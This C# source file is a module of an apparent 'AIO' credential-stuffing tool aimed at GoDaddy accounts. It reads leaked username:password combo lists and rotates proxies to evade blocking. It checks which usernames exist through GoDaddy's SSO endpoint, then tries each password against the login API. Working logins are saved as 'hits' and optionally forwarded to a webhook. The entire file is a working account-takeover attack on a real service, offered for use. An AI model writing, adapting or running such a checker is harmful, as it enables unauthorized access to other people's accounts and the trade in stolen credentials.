using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Godaddymod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            var capture = new StringBuilder();

                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = false;
                            req.AddHeader("Cookie", "visitor=vid=b35ec6bc-83fe-429e-9166-e335881f061a;");
                            req.AddHeader("Host", "sso.godaddy.com");
                            req.AddHeader("Origin", "https://sso.godaddy.com");
                            req.AddHeader("Referer", "https://sso.godaddy.com/?realm=idp&path=%2Fproducts&app=account");
                            req.AddHeader("Sec-Fetch-Dest", "empty");
                            req.AddHeader("Sec-Fetch-Mode", "cors");
                            req.AddHeader("Sec-Fetch-Site", "same-origin");
                            var str = "{\"checkusername\":\"" + array[0] + "\"}";
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var strResponse = req.Post("https://sso.godaddy.com/v1/api/idp/user/checkusername", str,
                                "application/json").ToString();
                            {
                                if (strResponse.Contains("username is invalid") ||
                                    strResponse.Contains("username is available"))
                                {
                                    Program.Fails++;
                                    Program.TotalChecks++;
                                }
                                else if (strResponse.Contains("username is unavailable") ||
                                         strResponse.Contains("message\": \"Ok")) //hit
                                {
                                    req.AddHeader("Cookie", "visitor=vid=b35ec6bc-83fe-429e-9166-e335881f061a;");
                                    req.AddHeader("Host", "sso.godaddy.com");
                                    req.AddHeader("DNT", "1");
                                    req.AddHeader("Origin", "https://sso.godaddy.com");
                                    req.AddHeader("Referer",
                                        "https://sso.godaddy.com/?realm=idp&path=%2Fproducts&app=account");
                                    req.AddHeader("Sec-Fetch-Dest", "empty");
                                    req.AddHeader("Sec-Fetch-Mode", "cors");
                                    req.AddHeader("User-Agent",
                                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36");
                                    var str2 = "{\"username\":\"" + array[0] + "\",\"password\":\"" + array[1] +
                                               "\",\"remember_me\":false,\"plid\":1,\"API_HOST\":\"godaddy.com\",\"captcha_code\":\"\",\"captcha_type\":\"recaptcha_v2_invisible\"}";
                                    var strResponse2 =
                                        req.Post(
                                            "https://sso.godaddy.com/v1/api/idp/login?realm=idp&path=%2Fproducts&app=account",
                                            str2, "application/json").ToString();
                                    if (strResponse2.Contains("Username and password did not match"))
                                    {
                                        Program.Fails++;
                                        Program.TotalChecks++;
                                    }
                                    else if (strResponse2.Contains("message\": \"Ok\""))
                                    {
                                        Program.Hits++;
                                        Program.TotalChecks++;
                                        Export.AsResult("/Godaddy_hits", array[0] + ":" + array[1]);
                                        if (Program.lorc == "LOG")
                                            Settings.PrintHit("Godaddy", array[0] + ":" + array[1]);
                                        if (Settings.sendToWebhook)
                                            Settings.sendTowebhook1(array[0] + ":" + array[1], "Godaddy Hits");
                                    }
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}